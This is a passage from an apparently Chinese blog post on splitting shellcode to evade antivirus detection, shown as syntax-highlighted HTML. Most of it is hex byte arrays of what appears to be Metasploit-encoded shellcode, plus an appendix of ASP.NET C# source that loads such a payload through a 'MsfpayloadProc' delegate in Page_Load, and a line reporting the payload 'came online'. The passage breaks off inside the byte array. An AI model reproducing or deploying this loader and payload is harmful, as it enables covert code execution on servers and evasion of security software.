<span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0xce</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">,</span>
<span class="token number">0xa1</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span>
<span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x8f</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0xdd</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span>
<span class="token number">0xd1</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0xc5</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0x8a</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span>
<span class="token number">0xfa</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0xa5</span><span class="token punctuation">,</span><span class="token number">0x95</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span>
<span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0x7b</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x7f</span><span class="token punctuation">,</span>
<span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0xcd</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x3e</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span>
<span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0xcb</span><span class="token punctuation">,</span><span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0xc6</span><span class="token punctuation">,</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xda</span><span class="token punctuation">,</span><span class="token number">0xc6</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span>
<span class="token number">0x7b</span><span class="token punctuation">,</span><span class="token number">0xdc</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0xee</span><span class="token punctuation">,</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0x95</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x97</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span>
<span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0xee</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0xa6</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x5d</span><span class="token punctuation">,</span>
<span class="token number">0x37</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x0e</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0x9f</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0xbc</span><span class="token punctuation">,</span>
<span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0xb2</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0xa6</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0x3e</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0xc5</span><span class="token punctuation">,</span><span class="token number">0x0d</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x6d</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span>
<span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0x9e</span><span class="token punctuation">,</span>
<span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0x7f</span><span class="token punctuation">,</span><span class="token number">0xfb</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0xe9</span><span class="token punctuation">,</span><span class="token number">0xd9</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008163620307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>其中分离shellcode。构造如下：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201008163635366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201008163641100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020100816364617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
上线成功，关于分离免杀的思路不仅仅限制于脚本，pe文件。包括powershell等。这是每一个安全从业者应该考虑的问题。</p>
<p><strong>附录：Source code</strong></p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">%</span>@ Page Language<span class="token operator">=</span><span class="token string">"C#"</span> AutoEventWireup<span class="token operator">=</span><span class="token string">"true"</span> Inherits<span class="token operator">=</span><span class="token string">"System.Web.UI.Page"</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>@ Import Namespace<span class="token operator">=</span><span class="token string">"System"</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>@ Import Namespace<span class="token operator">=</span><span class="token string">"System.Runtime.InteropServices"</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script runat<span class="token operator">=</span><span class="token string">"server"</span><span class="token operator">&gt;</span>
delegate <span class="token keyword">int</span> <span class="token function">MsfpayloadProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
protected <span class="token keyword">void</span> <span class="token function">Page_Load</span><span class="token punctuation">(</span>object sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    byte<span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> codeBytes<span class="token punctuation">[</span><span class="token number">509</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>
<span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0xb8</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0xb1</span><span class="token punctuation">,</span>
<span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x94</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>
<span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0xee</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0xce</span><span class="token punctuation">,</span><span class="token number">0x7a</span><span class="token punctuation">,</span><span class="token number">0x7b</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xae</span><span class="token punctuation">,</span><span class="token number">0xab</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span>
<span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x82</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0xaf</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span>
<span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0xda</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xca</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0x0d</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">,</span><span class="token number">0x94</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0xbc</span><span class="token punctuation">,</span>
<span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0xd1</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x9f</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x8f</span><span class="token punctuation">,</span><span class="token number">0xaa</span><span class="token punctuation">,</span><span class="token number">0xae</span><span class="token punctuation">,</span>
<span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0xcb</span><span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span>
<span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x3e</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0xdb</span><span class="token punctuation">,</span><span class="token number">0xe7</span><span class="token punctuation">,</span><span class="token number">0xc5</span><span class="token punctuation">,</span>
<span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0xbd</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xae</span><span class="token punctuation">,</span><span class="token number">0xd7</span><span class="token punctuation">,</span><span class="token number">0x82</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0xbd</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0xd2</span><span class="token punctuation">,</span>
<span class="token number">0x7a</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0xf7</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span>
<span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0xef</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span>
<span class="token number">0x1b</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0xe9</span><span class="token punctuation">,</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x3e</span><span class="token punctuation">,</span><span class="token number">0xdc</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0xf3</span><span class="token punctuation">,</span><span class="token number">0x9f</span><span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span>
<span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0xbc</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span>
<span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0xb8</span><span class="token punctuation">,</span><span class="token number">0x0e</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x9f</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x5c</span><span class="token punctuation">,</span>
<span class="token number">0xcd</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0xca</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0xf3</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xa1</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span>
<span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x9f</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span>
<span class="token number">0xcb</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xe7</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">,</span><span class="token number">0xa4</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0x8e</span><span class="token punctuation">,</span><span class="token number">0x9b</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x7b</span><span class="token punctuation">,</span>
<span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xf3</span><span class="token punctuation">,</span><span class="token number">0xa9</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0xfa</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span>
<span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xae</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span>
<span class="token number">0x1e</span><span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0xa5</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0x9c</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span>
<span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0xce</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">,</span>
